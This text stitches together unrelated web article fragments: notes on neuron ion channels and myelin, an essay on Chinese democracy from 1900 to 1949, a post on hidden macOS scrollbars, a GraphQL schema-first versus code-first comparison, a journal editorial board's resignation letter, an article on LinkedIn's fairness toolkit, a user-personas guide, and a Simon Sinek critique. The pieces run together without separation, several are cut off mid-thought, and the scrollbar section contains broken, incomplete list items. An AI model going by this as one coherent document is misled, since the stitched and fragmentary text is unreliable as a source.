<p>To start, Na+ channels dominate, but after they close, K⁺ outflow quickly makes the membrane voltage drop. This drop overshoots the initial resting level before leveling off at the voltage where K⁺ concentrations stay stable.</p>
<p>Then K⁺ channels gradually close.</p>
<p><img src="https://i-kh.net/images/the-magic-of-ion-channels/ion-channels-3.png" alt=" Na⁺ channel is closed. K⁺ has concentrations have leveled off around -73 mV, where K⁺ ions are equally likely to enter and exit the membrane."></p>
<p>The total number of ions exchanged throughout the whole process is minuscule, and has little impact on the overall concentration of ions inside or outside the cell.</p>
<p>When the channels create a voltage spike, they then trigger other nearby channels, which then trigger other channels, and so on. This makes the voltage spike travel down the length of the neuron. </p>
<p>The ion channels usually take time to reset before the next firing, so a single voltage spike doesn’t usually set off the entire neuron ringing indefinitely. However, the voltage can propagate from the base of the axon back into the dendrites, where it can play an important role in influencing whether the next incoming signal will set off the ion channels there.</p>
<p>Neurons are somewhat conductive, but not <em>very</em> conductive - they’re not copper wires. They’re also leaky - a large portion of their current seeps out into the surrounding intercellular fluid, partly because the cell membrane is not 100% impermeable to ions, and partly because of the membrane capacitance.  </p>
<p>That means that if a given ion channel generates some voltage locally, that voltage will quickly drop off as we move farther from that channel.</p>
<p>So the ion channels cannot be spaced too far apart, and the signal will travel only as fast as the channels can open and close between the start and the end of the axon.</p>
<p>Vertebrates (including humans) have a clever innovation to speed up the propagation of signals: they use myelin sheaths to insulate axons that travel over distances longer than millimeters.</p>
<p><img src="https://i-kh.net/images/the-magic-of-ion-channels/myelin-sheath.svg" alt="Myelin sheaths surrounding an axon of the peripheral nervous system (i.e. outside the brain or spine). Source: &quot;Anatomy and Physiology&quot; by the US National Cancer Institute's Surveillance, Epidemiology and End Results (SEER) Program."></p>
<p>Myelin sheaths form in 0.2- 1 mm segments over the neurons and are made from layers of cell membrane and protein made by the dedicated cells - oligodendrocytes in the brain and spinal cord, and by Schwann cells everywhere else.</p>
<p>Myelin significantly thickens the axon’s wall and reduces the amount of current leaked out through the cell membrane. This allows the myelinated neuron to space their ion channels farther apart, significantly speeding up the propagation of the voltage spikes.</p>

                    <div>
                        <p>In this essay, I’ll tell you a bit about early seeds of democracy in China during the period 1900-1949. Contrary to popular belief, this period was surprisingly modern and open. It starts towards the end of the Qing dynasty (大清, 1644-1912), goes through Republic of China (中華民國, 1912-1949*), and ends with Mao's People’s Republic Of China (中華人民共和國, 1949-).</p><p>This period - as well as the half century before - saw an increase in western influence. Militarily, this started with the British defeating China in the Opium War (1842) and the following Treaty of Nanjing, after which many events followed (another Opium War, more treaties, Sino-Japanese war, suppression of Boxer uprising, etc). This meant that there were treaty ports that were under foreign control by the French, British, Japanese, United States, etc. The former great Chinese empire lost a lot of its power. The current PRC government calls this the Century of humiliation (百年耻辱, 1842-1949).</p><p>Whether guns or books came first, this was also accompanied by an increased interest in western ideas. Western books were translated, a lot of them via Japanese. For example, Yan Fu (嚴復, 1854-1921) translated classics by people such as Darwin, Adam Smith, John Stuart Mill, Herbert Spencer, Montesquieu, etc around the turn of the century. <sup><a href="#notes">[1]</a></sup></p><p>Before these translations, certain Western concepts such as freedom or liberty didn’t exist. <em>Ziyou</em> (自由) came from a translation of John Stuart Mill’s <strong>On Liberty</strong> (possibly as a loan word via Japanese). The story is more complex than that, where concepts don’t always naturally map, and during e.g. Song dynasty the phrase appears to have been used, but without the political connotations.</p><p>A lot of this interest in Western ideas came from local individuals and merchants who perhaps were educated in the west and lived in Shanghai and similar treaty ports. Many of them were standing with one foot in Chinese culture and one in Western, and found ways to reconcile these, sometimes compatible sometimes contradictory, systems of thinking. They didn’t see Chinese culture as being incompatible with democracy. Instead, they faulted politics, specifically one party rule and civil strife. <sup><a href="#notes">[2]</a></sup>.</p><p>Due to wars and foreign intervention, the central government was fairly weak. However, in many places the local and provincial government was more powerful. In Chinese governance, like in many other countries, there is a clear distinction between the local, provincial and national levels. <sup><a href="#notes">[3]</a></sup> This era, with a weak national government, is often called the Warlord Era (軍閥時代).</p><figure><img src="https://upload.wikimedia.org/wikipedia/commons/3/32/China_imperialism_cartoon.jpg" alt="https://upload.wikimedia.org/wikipedia/commons/3/32/China_imperialism_cartoon.jpg"><figcaption>Political cartoon showing foreign powers carving up China. [16]</figcaption></figure><p>The term ’warlord’ brings images of military autocrats, chaos and mayhem. While there is some truth to that, the term itself was often used as a form of propaganda. Warlordism or militarism internally in China was linked to Western imperialism. <sup><a href="#notes">[4]</a></sup></p><p>Looking at casualties between major wars during 1917-1930, there were 400,000 deaths. This might seem like a lot, but China has a big population, and this was spread out over a long period of time. Rawski estimates that deaths from all causes at the time was 13.5 million per year, which means only one out of 500 deaths occurred on the battle field. <sup><a href="#notes">[5]</a></sup> This should also be compared with the 20m+ deaths during rebellions in 19th century, or millions killed during Mao era.</p><p>Hu Shih (胡適, 1891-1962), a famous philosopher and diplomat who studied in the US with John Dewey (school of pragmatism), noticed that a lot of the violence during the Warlord Era came from attempts to unify China from above.</p><blockquote>In a country as large as China, no matter how strong an order imposed from the centre, it would eventually produce division; well-run, self-administered localities, he believed, could knit the country together. <sup><a href="#notes">[6]</a></sup></blockquote><p>In other words, a voice for pragmatic localism and self-governance.</p><p>While explaining the origins of the Nationalist Party (KMT, 國民黨) and Communist Party (CCP, 中國共產黨) is not part of this essay, their names are pretty self-explanatory. They were both against Western imperialism, in their own way, and were trying to fill the gap after the Qing empire. There is an idea of 'revolution as history' where we focus largely on the history of revolutions and their proponents. Often these people are less important than they might appear. It is easy to look at this period and focus only on the Nationalist Party and Communist Party, but there were many other people and ideas that don’t fit neatly into this two party divide. They had their own interests, and had a big impact in terms of driving ideas of freedom and democracy. <sup><a href="#notes">[7]</a></sup></p><figure><img src="https://laosima.com/content/images/2020/08/image-2.png" alt=""><figcaption>Shanghai Street in early 1900s. [17]</figcaption></figure><p>In the early years during the twentieth century, several places in China had various forms of local elections.</p><p>Shanghai saw early democratic institutions in the form of a city council, which was outside of the Shanghai’s International Settlement. <sup><a href="#notes">[8]</a></sup> In 1907, the Shanghai General Works Board extended voting rights to everyone who was a resident for more than five years and paid a minimum amount of local taxes. This followed similar events in Tianjin City council elections the year prior. <sup><a href="#notes">[9]</a></sup></p><p>In 1909 China held elections with an elite of two million people. This was later expanded in 1912 to 40 million people. Fincher writes:</p><blockquote>these freely contested, and at the time, well reported elections produced representative assemblies which ended the world’s oldest monarchy, proclaimed Asia’s first republic, and practiced liberal democracy. <sup><a href="#notes">[10]</a></sup></blockquote><p>He later continues:</p><blockquote>as measured by electorate size, the Chinese polity had advanced in 1909 from the standard set in the Japanese election of 1890 of slightly more than 1 percent (of a population of 40 million) to slightly less than 2 percent (of 400 million). In 1912 the Chinese polity achieved a standard (10 per cent of 400 million) which Japan did not reach until 1928, in the first election to follow implementation in Japan of universal male suffrage. <sup><a href="#notes">[11]</a></sup></blockquote><p>Sun Yat-Sen (孫中山, 1866-1925) was the first leader of KMT, and the first president of the Republic Of China. He was well-read on the European Enlightenment and Chinese culture and attempted to bridge them in his own way. The plan was to have the "Nationalist revolution" in three phases, with the first being a violent unification of China, and the last being democratic constitutional rule. <sup><a href="#notes">[12]</a></sup> Unsurprisingly, they didn’t get to the latter phase.</p><p>One of the most important features of democracy, to be able to vote people out of office and keep them accountable with a rule of law, was missing from the very start:</p><blockquote>He left no notion as to how Chinese politics should be institutionalized, for his thought on public administration did not include ways of preventing those in authority from abusing their powers <sup><a>[13]</a></sup></blockquote><p>As Chiang Kai-shek (蔣中正, 1887-1975) eventually took over, it became more like a personal dictatorship with everything you’d expect from such a regime. <sup><a href="#notes">[14]</a></sup> There was one upside though. Unlike the communists, with the Nationalist government intellectuals could enjoy the freedom of silence. Generally speaking, intellectuals survived the Nationalist rule, unlike during CCP's rule. <sup><a href="#notes">[15]</a></sup></p><p>For whatever reason, liberal opposition and the third force failed. The CCP took over China, and KMT ended up in Taiwan (台灣). In Taiwan, more measures were taken, and it failed there as well. For a while, until it succeeded. But that’s a story for another time.</p><figure><img src="https://laosima.com/content/images/2020/08/shanghai1946.jpg" alt=""><figcaption><em>Exodus from Shanghai in 1949. [18]</em></figcaption></figure><p>Should we look at the current CCP government as a continuation of great empires, as they would like to see themselves, or something else?</p><p>Europe had kings and monarchies for a long time before modern democracy developed during the last few hundred years. As people get exposed to more ideas, we see which forms of governance works better. While progress isn’t linear or even necessarily a well-defined thing, useful systems tends to survive and fragile systems die out.</p><p>This is one of the reasons why you can't talk about e.g. Taiwan in mainland China.

                <p>
                  In 2011, Apple released
                  <a href="https://en.wikipedia.org/wiki/Mac_OS_X_Lion">Mac OS X Lion</a>
                  which introduced an enhanced scrollbar behavior that made
                  scrollbars hidden by default. The scrollbar appears when the
                  user starts scrolling a document and disappears after the
                  scrolling stops.
                </p>
                <p>
                  It appears, however, that this enhancement did not only change
                  the user interface, but has also shaped how developers (don't)
                  think about that specific UI element when creating
                  cross-platform solutions. I call it
                  <strong>scrollbar blindness</strong>.
                </p>
                <p>
                  Lately, for some reason, I've started to notice more of it. I
                  have been to numerous websites that have elements with
                  <code>overflow-y</code> or <code>overflow-x</code> set to
                  <code>scroll</code> while the element is not meant to be
                  scrollable. For no apparent reason, some even set both
                  <code>x</code> and <code>y</code> axes scrollable or create
                  multiple levels of stacked scrollbars.
                </p>
                <h2>Comparison</h2>
                <p>
                  Here's a side-by-side comparison of the same scrollbar-heavy
                  containers rendered by Firefox on Linux (with scrollbars) and
                  MacOS (without).

                <h2>Examples</h2>
                <p>
                  Here are some examples of scrollbar blindness I've stumbled
                  upon:
                </p>
                <ul>
                  <li>

                      <li>
                        Menu dropdowns have

                        Creator details modal has

                        underneath document's scrollbar. This produces a very
                        confusing user experience as the view is scrollable, but
                        the (document's) scrollbar is not moving. After
                        scrolling to the bottom of the modal, document's
                        scrollbar takes over and scrolls the main view instead.

                  <li>
                    <a href="https://www.recursive.design/">recursive.design</a>: Page and all text editing sections have unnecessary
                    horizontal scrollbars. In mobile view, some containers are
                    given an extra scrollbar.
                  </li>
                </ul>
                <p>
                  As can be seen from the examples, even big organizations like
                  Github and Snapchat that have tens if not a hundred front-end
                  developers and probably have a code review process in place,
                  let the problem slip through. I collected these examples
                  months ago and the scrollbars are still just as I found them.
                </p>
                <h2>Conclusion</h2>
                <p>
                  If you are a front-end developer that uses macOS, I kindly ask
                  you to dedicate a little more attention to how the websites
                  you create behave on platforms other than your own.
                  Alternatively, you can set the scrollbars to be visible at all
                  times by setting
                  <code>System Preferences -&gt; General -&gt; Show scroll bars</code>
                  to <code>Always</code>.
                </p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>GraphQL started back in 2012 at Facebook HQ. Before being publicly released in 2015 it was used internally as a cure to the underperformance observed in mobile apps on slower networks. GraphQL is a query language for APIs, its main advantage is allowing clients to define exactly what type of data is required. The centerpiece of any GraphQL project is its schema.</p>
<p><strong>GraphQL schema</strong> is a set of rules describing the functionality available to the client, including specification of operations (queries and mutations) that can be executed to execute against your data graph. </p>
<p>If you ever decide to build a GraphQL service at some point you would need to chose which approach you want to affiliate with more:</p>
<ul>
<li><strong>Schema-first</strong> - prioritizing process of designing the schema,</li>
<li><strong>Code-first (resolver-first)</strong> - approach prioritizing code over schema, where the GraphQL schema is generated programmatically.</li>
</ul>
<p>In either case, we will end up with a fully functional GraphQL service, but this choice will influence your project in terms of the amount of work you will need to put to achieve certain things like scaling your project etc.</p>

<h2>Schema-first</h2>
<p>Schema-first is an approach that puts schema as your source of truth and forces your code to follow the definitions stored in your schema. In general, prioritizing thinking about the schema. If schema design falls short, you might end up with an API that’s ignoring your business needs and needs of your end-users.</p>
<p><strong>Some of the pros:</strong></p>
<ul>
<li>it should most of the times results in a better-designed API,</li>
<li>it’s more abstract and less dependent by following the dependency inversion principle (DIP),</li>
<li>Schema-first approach reduces development time by allowing frontend and backend teams simultaneously (schema data is easily mockable i.e. with <a href="https://app.graphqleditor.com/explore-projects/twitter">graphql-editor mock backend feature 🚀</a>),</li>
</ul>
<p><strong>Some of the cons/difficulties:</strong></p>
<ul>
<li>the schema definition must be constantly synced with the resolvers, otherwise might cause serious problems,</li>
<li>might lead to code redundancy as SDL definitions are not so easily reusable,</li>
<li>difficulty in combining distributed schemas into a single schema (require using 3rd party tools like <a href="http://graphqleditor.com/">graphql-editor</a> or <a href="https://github.com/ardatan/graphql-tools">graphql-tools</a>)</li>
</ul>
<h2>Code-first</h2>
<p>Code-first (often called resolver-first) is a process where the schema is defined and implemented programmatically. The design process begins with coding the resolvers and the SDL version of the GraphQL schema is a generated artifact (created with a script, not manually). </p>
<p><strong>Some of the pros:</strong></p>
<ul>
<li>can work as a single source of truth as it keeps stored both the schema definitions as well as resolvers,</li>
<li>code-first can  easily overcome difficulties met in schema-first approach, without the usage of a vast amount of tools,</li>
<li>better manageable if you expect your schema to grow in complexity or size,</li>
</ul>
<p><strong>Some of the cons/difficulties:</strong></p>
<ul>
<li>having both the definitions and resolves might be less readable,</li>
<li>your API design is easier influenced by implementation rather than business needs,</li>
<li>backward-incompatible changes can slip in more easily compared to schema’s first approach.</li>
</ul>
<h2>The evolution</h2>
<p>When GraphQL was publicly released in the 2015 ecosystem we know haven’t existed (quite obvious) and the only things that we could lean on were the official GraphQL specification and <code>graphql-js</code> (the reference implementation in JavaScript) until 2016 when <code>graphql-tools</code> repo was founded which firstly promoted schema-first approach by separating two layers of working with schema:</p>
<ul>
<li><strong>the schema definition</strong> - writing GraphQL schema definition using Schema Definition Language (SDL),</li>
<li><strong>the schema implementation</strong> - writing required resolvers. </li>
</ul>
<p>After that, the schema-first become default approach but seeing its limitations people started looking for some workarounds which led to first code-first frameworks being released. The Code-first approach is becoming so popular that almost every GraphQL implementation now has its code-first alternative, or even focusing on only the code-first path.</p>

                  <p>August 25, 2020<br></p>
                  
                  <p>Dear Colleagues,<br></p>
                  
                  <p>We would like to inform you about an upcoming major transition for the Journal of Field Robotics.<br></p>
                  
                  <p>After 15 years of service, John Wiley and Sons, the publisher has decided not to renew the <br></p>
                  <p>contract of the Editor in Chief (Sanjiv Singh) and the Managing Editor (Sanae Minick) and <br></p>
                  <p>hence our term will expire at the end of 2020.<br></p>
                  
                  <p>This comes after two years of discussions between new Wiley representatives and the <br></p>
                  <p>Editorial Board have failed to converge to a common set of principles and procedures by <br></p>
                  <p>which the journal should operate. The Editorial Board has unanimously decided to resign.<br></p>
                  
                  <p>We do want to assure the authors who have papers under review that we see it as our <br></p>
                  <p>responsibility to bring these documents to resolution during our term. We will continue to <br></p>
                  <p>process new submissions until the end of the year. More about the future at the end of this note.<br></p>
                  
                  <p>While the issue at the heart of our disagreement with Wiley is about academic independence, <br></p>
                  <p>it should be noted that there is a structural issue here. Scholarly publishing is broadly in flux <br></p>
                  <p>at the moment in the search for a sustainable model. Currently, academics are not paid to <br></p>
                  <p>create and review articles.&nbsp; In fact, they often have to pay fees to publish, and, readers have <br></p>
                  <p>to pay to access the work through a pay per view system, or, through subscriptions. <br></p>
                  <p><a title="https://www.coalition-s.org" href="https://www.coalition-s.org/">Plan S</a>, an international consortium makes the dilemma clear:<br></p>
                  
                  <p>"Monetising the access to new and existing research results is profoundly at odds <br></p>
                  <p>with the ethos of science (Merton, 1973 )… In the 21st century, science publishers <br></p>
                  <p>should provide a service to help researchers disseminate their results. They may <br></p>
                  <p>be paid fair value for the services they are providing, but no science should be locked <br></p>
                  <p>behind paywalls!"<br></p>
                  
                  <p>While this moment calls for creativity and collaboration with the scholarly community to find <br></p>
                  <p>new models, Wiley is intent on making broad changes to the way that the Journal of Field <br></p>
                  <p>Robotics is operated, guided mostly by an economic calculation to increase revenue and <br></p>
                  <p>decrease costs. To do this, they have unilaterally decided to change the terms of the <br></p>
                  <p>contract that has been constant since the JFR was started in 2005. Wiley has confronted a <br></p>
                  <p>similar case (European Law Journal) with similar effect— <a onclick="window.open(this.href); return false;" title="https://europeanlawblog.eu/2020/02/04/what-a-journal-makes-as-we-say-goodbye-to-the-european-law-journal/" href="https://europeanlawblog.eu/2020/02/04/what-a-journal-makes-as-we-say-goodbye-to-the-european-law-journal/" onkeypress="window.open(this.href); return false;">the entire editorial board has <br></a></p>
                  <p><a onclick="window.open(this.href); return false;" title="https://europeanlawblog.eu/2020/02/04/what-a-journal-makes-as-we-say-goodbye-to-the-european-law-journal/" href="https://europeanlawblog.eu/2020/02/04/what-a-journal-makes-as-we-say-goodbye-to-the-european-law-journal/" onkeypress="window.open(this.href); return false;">resigned in January of 2020:</a><span><br></span></p>
                  
                  <p>Wiley insists that the new contract is covered under a confidentiality agreement that not even <br></p>
                  <p>the Editorial Board can examine. What we can say is that the net effect of Wiley’s demands <br></p>
                  <p>would make the Editors contractors to the publisher rather than having them respond to the <br></p>
                  <p>board. We see this as a breach of academic autonomy.<br></p>
                  
                  <p>In resigning, the Editorial Board of the Journal of Field Robotics reaffirms its commitment to <br></p>
                  <p>dissemination and discussion of research. In the near future we will announce a new forum <br></p>
                  <p>for research in Field Robotics that will maintain the academic integrity of our editorial process <br></p>
                  <p>while also ensuring open dissemination of your research.<br></p>

<p>LinkedIn Fairness Toolkit (LiFT) was <a href="https://github.com/linkedin/LiFT">released</a> by the largest professional networking giant to enhance explainable AI initiatives by practitioners and organizations. This comes at the time when we are witnessing heated debate about the fairness of computer vision technology. Today, artificial intelligence is being used in a wide range of solutions right from identity authentication to determining defects in products and finding people with facial recognition. However, the lack of explainability in machine learning models has become a major roadblock that is hampering the proliferation of the latest technologies.</p>



<p>Although a wide range of libraries, services, and methodologies have been released in the last few years such as LIME, IBM Fairness 360 Toolkit, FAT-Forensics, DeepLIFT, Skater, SHAP, Rulex, <a href="https://cloud.google.com/explainable-ai">Google Explainable AI</a>, among others, the solutions have failed to democratize among users as they fail to deliver in large-scale problems or are very specific to cloud or use cases. Consequently, there was a need for a toolkit that can be leveraged across different platforms and problems.</p>

<p>This is where LinkedIn Fairness Toolkit bridges such gaps in the artificial intelligence landscape by enabling practitioners to deliver machine learning models to users without bias.</p>



<h3>LinkedIn Fairness Toolkit (LiFT)</h3>



<p>LinkedIn Fairness Toolkit is a Scala/Spark library that can evaluate biases in the entire lifecycle of model development workflows, even in large-scale machine learning projects. As per the release <a href="https://engineering.linkedin.com/blog/2020/lift-addressing-bias-in-large-scale-ai-applications">note</a> of LinkedIn, the library has broad utility for organizations that wish to conduct regular analyses of the fairness of their own models and data.</p>



<p>Since machine learning models are now actively used in healthcare and criminal justice, it is necessary for an explainable toolkit to find correlation among different categories effectively. Consequently, LinkedIn Fairness Toolkit is a near-perfect fit for such use cases as it can be deployed to measure biases in training data, detect statistically significant differences in models’ performance across different subgroups, and evaluate fairness in ad hoc analysis.&nbsp;</p>

<p>In addition, LinkedIn Fairness Toolkit comes with a unique metric-agnostic <a href="https://arxiv.org/abs/2007.05124">permutation testing</a> framework that identifies statistically significant differences in model performance (as measured according to any given assessment metric) across different subgroups. However, the <a href="https://arxiv.org/abs/2007.05124">Evaluating Fairness Using Permutation Tests</a> methodology will appear at <a href="https://www.kdd.org/kdd2020/">KDD 2020</a>, the authors noted.</p>



<h3>What’s Behind LiFT?</h3>



<figure><img src="https://lh4.googleusercontent.com/KJkaTpDgFNYr1LTch4SVU55G5IDOA8KJsUUR107DSQ09VjLkaeBz_Gofs14li-qlMFqxl7yR3A9YMXP6VjOWi__bELi5ABK-xuL2G2cfb1Lh1kES80MDzvhK2LaJIGDY1tGJools" alt=""><figcaption>LinkedIn Fairness Toolkit</figcaption></figure>



<p>Built to work effortlessly on large scale machine learning workflows, the library can be used at any stage of the models’ development. As a result, you can carry out ad hoc analysis and still interact with the library for explainability. While the library provides flexibility as it can be used in production and even on Jupyter Notebook, for scalability while measuring bias, it leverages Apache Spark to enable you to process a colossal amount of data distributed over numerous nodes.</p>



<figure><img src="https://lh6.googleusercontent.com/SWa0QVPVLPbE-Ik_RcWWwfgcH_GhxYjmpXC2cr2UvOAD1aI43nhCIS7C3j5cw-5vNXFnQxkmJt3iQVtUCDxSFEpZYk-4K-u2e6L4Y2W_0JbaNy8W7OnvPfzPVofcQR5HqL34YtYu" alt=""><figcaption>High-level and low-level APIs</figcaption></figure>



<p>The design of the LinkedIn Fairness Toolkit also offers multiple interfaces based on the use cases with its high-level and low-level APIs for assessing fairness in models. While the high-level APIs can be used to compute metrics available, with parameterization handled by appropriate configuration classes, the low-level APIs enable users to integrate just a few metrics into their applications, or extend the provided classes to computer custom metrics.</p>



<p>LinkedIn has been using LinkedIn Fairness Toolkit for various machine learning models for explainability. For one, its job recommendation, when checked with LiFT, did not discriminate between gender. The model in production showed no significant difference in the probability of ranking a positive/relevant result above an irrelevant result between men and women.</p>

<p>By making the library open-source, the social media giant is committed to further enhancing its functionality. The <a href="https://engineering.linkedin.com/teams/data/artificial-intelligence">AI team at LinkedIn</a> is also working toward bringing fairness while eliminating bias for recommendation systems and ranking problems.</p>

<p>We will explain what User Personas are, what they are not, why every Designer should use them when building interfaces that target specific User Groups.</p>
<h2>What are User Personas?</h2>
<div><p>User experience designers (UX) use so called <i>user personas</i> in their creative process because they give answers to three simple questions related to building the best possible product presentation: “Who? What? Why?”. Personas are fictional characters that designers use to develop an accurate customer profile. They are part of intense product development strategies, and, with their help, companies achieve higher customer satisfaction rates.</p><p>But how a simple character sheet improves usability and connects vendors with their most potential customers?</p></div>
<p><img src="https://cdn.codecoda.com/img/pixel.gif" data-plugin-lazyload="" data-plugin-options="{'effect' : 'fadeIn', 'speed' : 'fast'}" data-original="https://cdn.codecoda.com/img/blog/user-personas/user-personas-benefits.jpg" alt="User Personas Benefits Introduction"></p>
<h2>What to include in Personas Template?</h2>
<div><p>Personas can define a multitude of characters, based on further details like a specific product line, customer demographics, and more. Using an empathy map, for example, helps designers and sales specialists take a closer peek at their clients’ minds. These virtual characters help define what customers say, think, feel, and do in life, and especially what their view is about offered products and services.</p><p>Designers begin building the profile of that ideal client by gathering all possible user data. Important to note here is that accurate customer profiling does not necessarily mean borderline privacy breach. The base component for creating a good skeleton for a useful customer profile mostly consists of readily available data. Once designers round up all the relevant information, they can easily highlight general human behavior.</p><p>Although people differ vastly when directly compared, as customers, there are specific drives, motivations and conditions that allow marketers to funnel them into an easy to manage character categories, and use that to customize further the services they offer to them, and how they offer them. Personas are, after all, the answer to ‘Who? What? Why?’ of the ultimate user experience.</p><p>Depending on the project scope, profile data may all go in compiling a single virtual profile or become the base for multiple profiles, each addressing specific services, product categories, and so on. Most businesses use three to five different fictional customer profiles. While every Designer can personally shape up their persona profile, there are some general items worth including in the template.</p></div>
<p><img src="https://cdn.codecoda.com/img/pixel.gif" data-plugin-lazyload="" data-plugin-options="{'effect' : 'fadeIn', 'speed' : 'fast'}" data-original="https://cdn.codecoda.com/img/blog/user-personas/user-personas-sample-profile.jpg" alt="User Personas Sample Profile"></p>
<ol><li><b>Basic information</b><br>Create character names and titles wisely and avoid using them arbitrarily. Giving a real Persona name like Maria suggests that users are female, which will undoubtedly contribute to making the wrong decision. Persona’s title allows us to quickly reference a group of users with similarities relevant to the product in question. Designers need to make sure their persona titles are specific. If a persona carries the title “Influencer,” this may lead to more issues and complications, rather than narrow down customers by a viable factor. Does this group of people consist of students, freelancers, or prospects? What are their passions and motivations? Do you have an insight into their shopping patterns?</li>
<li><b>Demographics</b><br>This socio-economic feature is the key to your target market and includes factors like age, sex, location, education, religion. Although all of these can play a detrimental role in target audience campaigns, deep down the road, no two people are exactly alike. Two women who have the same age and live in the same area don’t necessarily share the same interests, needs, or pain-points. Demographics data is meaningless without an intense cross-analysis.</li>
<li><b>Job title, material status, family</b><br>Developing a marketable product is about a process that sells or serves real people. People who hold various jobs, care for a family, or mingle within social circles. Customer details reveal a lot about their goals and problems, and what they are as a person. All information — even features from outside the definition of ‘customer’ — can be translated into meaningful persona profiles.</li>
<li><b>Image</b><br>As humans, we interact with each other daily. Every normal interaction are great sources for lead designers, who use them when they try to give their persona a face. Images add a real feel about the user exact identity. Customer profiling is not always a straight forward process - sometimes, finding the right image requires nothing short of hard detective work. When done right, a relistic persona profile allows for certain personality traits to emerge from the raw data. Customers’ emotional and mental capacities are true indicators for intention, and images are powerful influencers of mood and <a href="https://enterprise.press/stories/2020/02/05/the-psychology-of-visuals-how-images-impact-decision-making-11273/" target="_blank" rel="nofollow">decision-making</a>.</li>
<li><b>Pain points</b><br>Pain points are barriers that stand between your business intentions and how they reflect on the customer. When shaping the customer’s journey, the process does not come smooth automatically. There are often rough patches that need clearing. Unfortunately, clients may stumble on such ‘bumps on the road’ first-hand. For example, a page malfunction can cause visitors to collectively reach a dead while shopping or browsing. Additionally, pain points such as this one can be as diverse as the people who experience them. Finding, understanding, and solving these problems are the keys to successful design but are demanding in the variety of challenges. A few useful ways to diminish pain points are by constructing and executing online surveys. Make your sales team talkative with customers. interactive customer feedback like Online Reviews gives a piece of instantaneous information about potential problems.</li>
<li><b>Goals</b><br>Personas’ goals should be aligned with the goals and intentions behind marketing products and services. It is all about “What they want to accomplish? Why?” Discovering users’ emotions is a step that sits higher in the hierarchy of persona profile. Once you begin to see your clients from the perspective of a good friend, you get to witness the real value of your product, and why your services are their preferred choice.</li></ol>

<h2>Why do Personas fail?</h2>
<div><p>The profile of your ideal client is not going to be a perfect match with any of your existing customers. However, when people a product repeatedly, it becomes a second nature for the provider to expect, predict, and improve their business based on recurring customer behavior. When researching and building a persona, designers sometimes forget that this fictional profile must represent a real person. Customers are people with real lives and problems and are not easy to predict or put into a category. Shopping is only a single task on their busy schedule, and they probably don’t much obsess about your service. Human personality is a quirky matter and frequently defies straightforward answers or obvious answers derived from raw statistics.</p><p>Junior designers make one common mistake when creating a personal profile – they interview their friends and risk flooding their research data with the wrong set of information. Customer profiles benefit from accurate or unbiased information, which, in turn, helps designers believe in the problem they are trying to solve. When collecting data, it is much better to get more of it, than not enough. At the same time, wordy and irrelevant details are best excluded. They would only muddy-up the data and compromise its relevancy. Sifting through pieces of information has always been a tough challenge, even more so in Persona creation, because of the ever-present unpredictability of the human factor.</p></div>

<h2>Why do you need a Persona?</h2>
<div><p>By knowing the goals and frustrations of your users, it’s easier to understand them. View them as a network of features that define an individual, rather than the purpose of everyone in the network. Design a product that will satisfy that individual’s needs, and you have yourself a winning strategy featuring a persona model.</p><p>Persona works standalone, but usually, it is essential to create different groups of virtual people. These fake characters help designers build robust user-oriented features. A persona-related design can help experts predict what the customer would do or want next or help prevent problems before they occur.</p></div>

<p>Successful Designer’s teams are the ones who can walk in the client’s shoes. They understand the problem from a more realistic perspective. What would your Persona think when you add a new feature to the app they use? What was the motivation behind the idea of this service or product? What issues and pain-points do they face? Smart design decisions featuring personas come as a result of getting the right answers to questions like these.</p>
<h2>What problems does a Persona solve?</h2>
<p>There are no disputes over whether a good UX comes easily. Designers need to understand the full spectrum of product cycle and value, business statistics, the tech used, and everything that has anything to do with the product. If you want to make successful products – get to know what your customer wants. Persona also represents a selective gathering of user’s behavior patterns, later used to match the expectations and motivations of customers.</p>

<div><p>View the flow of the users’ day better, how and when they interact. Do not focus on “How does this work?”.&nbsp; Creating a good UX is to design the best product for others and their goals. It helps teams make a smooth transition between requirements and design.</p><p>Thanks to the use of Personas, our team working on the <b><a href="https://codecoda.com/en/case-studies/case-study-metime-connecting-beauty-practicioners-with-clients-around-the-globe">MeTime</a></b> project managed to solve a lot of problems with it.

<p>Unless you’ve been living under a rock, you’ll have heard of Simon Sinek.&nbsp; He took the business world by storm in 2009 with his lecture, <a href="https://www.ted.com/talks/simon_sinek_how_great_leaders_inspire_action?language=en">‘How Great Leaders Inspire Action’</a>.&nbsp; This became the 3<sup>rd</sup> most-watched TED talk of all time.&nbsp; In it, he unveiled his ‘Golden Circle’ with ‘Why’ at its heart.&nbsp; His book <a href="https://www.amazon.co.uk/Start-Why-Leaders-Inspire-Everyone/dp/0241958229/ref=sr_1_1?adgrpid=54915772044&amp;gclid=Cj0KCQiAvc_xBRCYARIsAC5QT9kMs6fl_tHoNJWH1_5FVGK6ayPdF9A3pdNnBaoJWPMwZhHqbdLdVY0aAiC2EALw_wcB&amp;hvadid=259037696121&amp;hvdev=c&amp;hvlocphy=1007044&amp;hvnetw=g&amp;hvqmt=e&amp;hvrand=1751487360736231536&amp;hvtargid=aud-857384558340%3Akwd-296960221096&amp;hydadcr=18496_1817309&amp;keywords=start+with+why+by+simon+sinek&amp;qid=1580474176&amp;s=books&amp;sr=1-1">‘Start with Why’</a> became a best-seller and his views were widely accepted by companies across the globe.&nbsp; An obsession with ‘Purpose’ began.</p>



<p>It is now a mainstream belief that <a href="https://www.monkhouseandcompany.com/blog/why-businesses-with-purpose-grow-faster/">businesses with a strong idea of their core purpose</a> prosper.&nbsp; Other writers have developed this concept, such as <a href="https://www.monkhouseandcompany.com/podcast/a-conversation-with-hiut-denim-co-ceo-david-hieatt/">David Hieatt in his book ‘Do Purpose – Why Brands with a Purpose Do Better and Matter More’.</a>&nbsp; This is a belief I share.  There’s no arguing with the importance of purpose.  As <a href="https://www.monkhouseandcompany.com/about-dominic-monkhouse/">MD of two tech companies</a> that grew from zero to £30 million in just 5 years, I’ve seen with my own eyes the difference it can make to a business.</p>



<p>But where I disagree fundamentally with Sinek is his central message of ‘starting with why’.&nbsp; This isn’t where you should start at all.</p>



<h2><strong>What’s the thrust of Sinek’s message?</strong></h2>



<p>Sinek set out to discover why companies like Apple achieved such extraordinary success while others, with the same resources, failed.&nbsp; He found that less successful companies often started with ‘What’, then moved to ‘How’ and many neglected to even mention ‘Why’.  Some hadn’t the faintest clue why they did what they did.&nbsp;</p>



<p>In Sinek’s opinion, the reason Apple was so successful was it started with ‘Why’.&nbsp; This was at the core of Apple’s marketing (pardon the pun!) and the driving force behind its business operations.&nbsp; As a result, he says, Apple was able to attract customers who shared its fundamental beliefs.&nbsp;</p>



